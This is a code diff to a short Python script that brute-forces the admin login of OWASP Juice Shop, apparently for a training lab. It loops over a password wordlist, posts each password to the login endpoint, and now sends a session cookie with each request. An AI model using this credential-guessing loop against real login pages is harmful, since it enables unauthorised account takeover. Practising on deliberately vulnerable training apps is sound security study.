@@ -7,10 +7,12 @@ import requests
 # Bigger files on https://haveibeenpwned.com/Passwords
 
 # define the webpage you want to crack
-url = "http://localhost:3000/rest/user/login/"
+url = "*juice-shop-url*/rest/user/login/"
 
 # We know the admin user name
 email = "admin@juice-sh.op"
+# Get value from the initial login request. Replace "COOKIE VALUE HERE" with that value.
+cookies = {'__Secure-balancer': 'COOKIE VALUE HERE'}
 
 # Find a password file - e.g.
 # open the password file in read mode
@@ -24,7 +26,7 @@ for password in file.readlines():
     # collect the data needed from "inspect element"
     data = {'email':email, 'password':password}
     print("[*] Attempting password: %s" % password)
-    send_data_url = requests.post(url, data=data)
+    send_data_url = requests.post(url, data=data, cookies=cookies)
 
     if send_data_url.status_code == 200:
         print("[*] Password found: %s " % password)
